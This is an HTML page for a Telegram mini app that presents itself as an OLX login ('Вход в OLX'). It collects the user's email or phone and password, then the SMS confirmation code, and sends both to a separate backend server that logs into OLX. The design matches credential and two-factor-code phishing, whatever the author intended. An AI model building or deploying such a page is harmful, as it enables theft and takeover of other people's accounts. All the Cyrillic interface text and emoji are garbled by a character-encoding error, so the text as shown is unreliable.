<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: var(--tg-theme-bg-color); color: var(--tg-theme-text-color); }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #ccc; }
        button { width: 100%; padding: 15px; background: #2ea6ff; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div id="loginForm">
        <h3>–í—Ö–æ–¥ –≤ OLX</h3>
        <input type="text" id="email" placeholder="Email –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω">
        <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å">
        <button onclick="startLogin()">–í–æ–π—Ç–∏</button>
    </div>

    <div id="smsForm" class="hidden">
        <h3>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ –°–ú–°</h3>
        <p>OLX –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</p>
        <input type="text" id="smsCode" placeholder="–ö–æ–¥ –∏–∑ –°–ú–°">
        <button onclick="sendSms()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
    </div>

    <div id="status"></div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        // –ê–¥—Ä–µ—Å —Ç–≤–æ–µ–≥–æ –±—ç–∫–µ–Ω–¥–∞ (Python —Å–µ—Ä–≤–µ—Ä–∞)
        const API_URL = "https://tvoj-server.com/api"; 

        async function startLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const userId = tg.initDataUnsafe.user.id;

            document.getElementById('status').innerText = "üîÑ –ü—Ä–æ–±—É—é –≤–æ–π—Ç–∏... (—ç—Ç–æ –∑–∞–π–º–µ—Ç 10-20 —Å–µ–∫)";
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –±–æ—Ç—É
            try {
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId, email, password })
                });
                
                const data = await response.json();
                
                if (data.status === 'sms_required') {
                    // –ï—Å–ª–∏ OLX –ø–æ–ø—Ä–æ—Å–∏–ª –°–ú–°
                    document.getElementById('loginForm').classList.add('hidden');
                    document.getElementById('smsForm').classList.remove('hidden');
                    document.getElementById('status').innerText = "";
                } else if (data.status === 'success') {
                    // –£—Å–ø–µ—Ö!
                    tg.sendData(JSON.stringify({ action: 'login_success', account_id: data.account_id }));
                    tg.close();
                } else {
                    document.getElementById('status').innerText = "‚ùå –û—à–∏–±–∫–∞: " + data.message;
                }
            } catch (e) {
                document.getElementById('status').innerText = "–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è";
            }
        }

        async function sendSms() {
            const code = document.getElementById('smsCode').value;
            const userId = tg.initDataUnsafe.user.id;
            
            document.getElementById('status').innerText = "üîÑ –ü—Ä–æ–≤–µ—Ä—è—é –∫–æ–¥...";

            const response = await fetch(`${API_URL}/verify-sms`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ user_id: userId, code })
            });
            
            const data = await response.json();
            
            if (data.status === 'success') {
                tg.sendData(JSON.stringify({ action: 'login_success', account_id: data.account_id }));
                tg.close();
            } else {
                document.getElementById('status').innerText = "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥";
            }
        }
    </script>
</body>
</html>
